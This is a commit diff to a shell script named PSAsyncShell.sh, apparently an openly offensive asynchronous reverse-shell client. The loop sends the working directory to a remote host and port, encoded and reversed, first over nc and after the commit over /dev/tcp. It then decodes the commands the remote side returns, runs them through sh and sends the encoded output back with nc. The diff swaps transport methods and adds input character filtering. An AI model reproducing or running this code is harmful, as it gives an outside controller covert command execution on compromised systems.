0671697b254521c2f1c8dcce263c202bfdf72792
Joel GM <34335312+JoelGMSec@users.noreply.github.com>
2023-11-08 13:29:09 +0100

    Update PSAsyncShell.sh

--- PSAsyncShell.sh
+++ PSAsyncShell.sh
@@ -9,18 +9,18 @@ host=$2
 port=$3
 
 # Main
-while $true ; do
-base64url=$(echo -n $(pwd) | base64 | tr '/+' '_-' | tr -d '=' | rev | nc $host $port 2> /dev/null)
-base64url=$(echo -n $base64url | rev)
+while true ; do
+base64url=$(echo -n $(pwd) | base64 | tr '/+' '_-' | tr -d '=' | rev | cat < /dev/tcp/$host/$port 2>/dev/null)
+base64url=$(echo -n $base64url | tr -d '.{}><*$%:;()@~=[]!?^&|#/' | rev)
 base64url=$(echo -n "$base64url"==== | fold -w 4 | sed '$ d' | tr -d '\n' | tr '_-' '/+' | base64 -d)
 sleep 0.5
 
 if [[ $base64url == "exit" ]] ; then
 exit 0
-fi 
+fi
 
 if [[ ! $base64url == "[+]*" ]] ; then
 base64url=$(echo -n "$base64url" | sed "s/Set-Location/cd/")
 base64url=$(echo -n "$base64url" | sh 2> /dev/null | base64 | tr '/+' '_-' | tr -d '=' | tr -d '[:space:]' | rev)
-echo -n "$base64url" | nc $host $port > /dev/null 2>&1
+base64url=$(echo "$base64url" | nc $host $port 2> /dev/null)
 fi ; done
